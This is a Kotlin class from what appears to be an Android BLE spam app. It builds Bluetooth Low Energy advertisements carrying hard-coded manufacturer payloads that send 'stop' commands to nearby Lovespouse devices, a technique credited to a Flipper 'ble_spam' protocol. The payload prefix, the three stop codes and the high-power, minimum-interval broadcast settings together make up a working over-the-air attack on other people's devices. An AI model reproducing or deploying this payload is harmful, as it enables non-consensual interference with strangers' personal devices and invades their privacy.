package io.github.kirillka645.bleadvertiserpro.AdvertisementSetGenerators

import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import io.github.kirillka645.bleadvertiserpro.Callbacks.GenericAdvertisingCallback
import io.github.kirillka645.bleadvertiserpro.Callbacks.GenericAdvertisingSetCallback
import io.github.kirillka645.bleadvertiserpro.Constants.Constants
import io.github.kirillka645.bleadvertiserpro.Enums.AdvertiseMode
import io.github.kirillka645.bleadvertiserpro.Enums.AdvertisementSetRange
import io.github.kirillka645.bleadvertiserpro.Enums.AdvertisementSetType
import io.github.kirillka645.bleadvertiserpro.Enums.AdvertisementTarget
import io.github.kirillka645.bleadvertiserpro.Enums.PrimaryPhy
import io.github.kirillka645.bleadvertiserpro.Enums.SecondaryPhy
import io.github.kirillka645.bleadvertiserpro.Enums.TxPowerLevel
import io.github.kirillka645.bleadvertiserpro.Helpers.StringHelpers
import io.github.kirillka645.bleadvertiserpro.Helpers.StringHelpers.Companion.toHexString
import io.github.kirillka645.bleadvertiserpro.Models.AdvertisementSet
import io.github.kirillka645.bleadvertiserpro.Models.ManufacturerSpecificData
import kotlin.random.Random

class LovespouseStopAdvertisementSetGenerator:IAdvertisementSetGenerator {

    // Reversed from here: https://github.com/Flipper-XFW/Xtreme-Apps/blob/cb38588d1b6dc775e41af99625dc369b665ebe53/ble_spam/protocols/lovespouse.c
    // Discovered by @mandomat
    // Blog post at https://mandomat.github.io/2023-11-13-denial-of-pleasure/

    private val _logTag = "LovespouseStopAdvertisementSetGenerator"

    val lovespouseStops = mapOf(
        "E5157D" to "Classic Stop",
        "D5964C" to "Independent 1 Stop",
        "A5113F" to "Independent 2 Stop",
    )

    private val _manufacturerId = Constants.MANUFACTURER_ID_TYPO_PRODUCTS

    override fun getAdvertisementSets(inputData: Map<String, String>?): List<AdvertisementSet> {
        var advertisementSets: MutableList<AdvertisementSet> = mutableListOf()

        val data = inputData ?: lovespouseStops

        data.forEach { lovespouseStop ->
            var advertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_LOVESPOUSE
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_LOVESPOUSE_STOP
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_FAR

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            // Phy is only used in non Legacy Mode
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_CODED
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_CODED
            advertisementSet.advertisingSetParameters.scanable = true
            advertisementSet.advertisingSetParameters.connectable = false

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = _manufacturerId

            var lovespousePrefix = "FFFF006DB643CE97FE427C"
            var lovespouseAppendix = "03038FAE"

            var payload = lovespousePrefix + lovespouseStop.key + lovespouseAppendix

            manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(payload)

            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            //advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.title = lovespouseStop.value

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets
    }
}